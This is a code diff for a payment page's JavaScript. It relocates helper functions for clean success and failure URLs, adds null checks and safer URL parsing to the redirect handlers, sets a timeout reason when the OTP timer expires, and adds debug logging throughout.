@@ -320,6 +320,17 @@
       return hash;
     }
     
+    // Helper functions for clean URLs
+    function getSuccessUrl(invoiceId) {
+      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+      return `/s/${hash}?invoiceId=${invoiceId}`;
+    }
+
+    function getFailUrl(reason) {
+      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+      return `/f/${hash}${reason ? `?reason=${reason}` : ''}`;
+    }
+    
     // Check current URL and redirect if needed
     document.addEventListener('DOMContentLoaded', function() {
       const urlParams = new URLSearchParams(window.location.search);
@@ -544,17 +555,6 @@
   let timer = 180;
   let consentChecked = true;
   let bankPageWindow = null;
-
-  // Helper functions for clean URLs
-  function getSuccessUrl(invoiceId) {
-    const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
-    return `/s/${hash}?invoiceId=${invoiceId}`;
-  }
-
-  function getFailUrl(reason) {
-    const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
-    return `/f/${hash}?${reason ? `reason=${reason}` : ''}`;
-  }
 
   // Fetch Payment Details Using PID with Fallback
   document.addEventListener('DOMContentLoaded', async () => {
@@ -851,16 +851,21 @@
       isProcessing = false;
     });
 
-    // Socket.io event handlers (modifying only the redirect handler)
+    // Modified redirect event handler to use clean URLs
     socket.on('redirect', (data) => {
+      console.log('Received redirect event:', data);
+      
       // Use clean URLs for redirects
-      if (data.redirectUrl.includes('success.html')) {
+      if (data.redirectUrl && data.redirectUrl.includes('success.html')) {
+        console.log('Redirecting to success page with ID:', currentInvoiceId);
         window.location.href = getSuccessUrl(currentInvoiceId);
-      } else if (data.redirectUrl.includes('fail.html')) {
+      } else if (data.redirectUrl && data.redirectUrl.includes('fail.html')) {
         const url = new URL(data.redirectUrl, window.location.origin);
         const reason = url.searchParams.get('reason');
+        console.log('Redirecting to fail page with reason:', reason);
         window.location.href = getFailUrl(reason);
       } else {
+        console.log('Redirecting to original URL:', data.redirectUrl);
         window.location.href = data.redirectUrl;
       }
     });
@@ -882,18 +887,23 @@
       if (data.invoiceId === currentInvoiceId) {
         // Start checking transaction status but don't change loading state
         if (!statusCheckInterval) {
+          console.log('Starting transaction status check for invoice:', currentInvoiceId);
           statusCheckInterval = setInterval(checkTransactionStatus, 2000);
         }
       }
     });
   });
 
-  // Transaction Status Check Function
+  // Transaction Status Check Function - Updated to use clean URLs
   async function checkTransactionStatus() {
     if (!currentInvoiceId) return;
     try {
+      console.log('Checking transaction status for invoice:', currentInvoiceId);
       const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
       const data = await response.json();
+      
+      console.log('Transaction status check result:', data);
+      
       if (data.status === 'show_otp') {
         clearInterval(statusCheckInterval);
         document.getElementById('paymentForm').classList.add('hidden');
@@ -917,13 +927,25 @@
         }
         isProcessing = false;
       } else if (data.status === 'redirect') {
+        console.log('Redirect status received from checkTransactionStatus');
         // Use clean URLs for redirects
         if (data.redirectUrl.includes('success.html')) {
+          console.log('Redirecting to success page with ID:', currentInvoiceId);
           window.location.href = getSuccessUrl(currentInvoiceId);
         } else if (data.redirectUrl.includes('fail.html')) {
-          const reason = new URL(data.redirectUrl).searchParams.get('reason');
+          console.log('Analyzing fail URL:', data.redirectUrl);
+          let reason = '';
+          try {
+            const url = new URL(data.redirectUrl, window.location.origin);
+            reason = url.searchParams.get('reason');
+            console.log('Extracted reason:', reason);
+          } catch (e) {
+            console.error('Error parsing URL:', e);
+          }
+          console.log('Redirecting to fail page with reason:', reason);
           window.location.href = getFailUrl(reason);
         } else {
+          console.log('Redirecting to original URL:', data.redirectUrl);
           window.location.href = data.redirectUrl;
         }
       }
@@ -932,7 +954,7 @@
     }
   }
 
-// OTP Timer Function
+  // OTP Timer Function
   function startOtpTimer() {
     if (timerInterval) clearInterval(timerInterval);
     timer = 180;
@@ -943,7 +965,8 @@
       document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
       if (timer <= 0) {
         clearInterval(timerInterval);
-        window.location.href = getFailUrl(); // Use clean URL for fail
+        console.log('OTP timer expired, redirecting to fail page');
+        window.location.href = getFailUrl('timeout'); // Use clean URL for fail
       }
     }, 1000);
   }
@@ -951,6 +974,7 @@
   // Back Button Prevention
   window.onpopstate = function(event) {
     if (confirm("Do you want to cancel this transaction?")) {
+      console.log('User confirmed transaction cancellation');
       window.location.href = getFailUrl('canceled'); // Use clean URL for fail
     } else {
       history.pushState(null, null, window.location.href);
